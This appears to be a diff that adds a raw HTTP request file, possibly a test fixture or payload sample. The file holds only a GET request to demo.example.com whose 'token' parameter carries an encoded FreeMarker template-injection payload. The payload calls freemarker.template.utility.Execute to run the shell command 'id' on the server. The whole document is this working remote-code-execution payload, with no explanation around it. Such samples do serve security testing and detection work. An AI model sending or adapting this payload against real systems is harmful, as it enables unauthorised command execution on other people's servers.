@@ -1,0 +1,4 @@
+GET /a?token=\u003C%23assign%20ex%3D\u0022freemarker.template.utility.Execute\u0022%3Fnew()\u003E${ex(\u0022id\u0022)} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
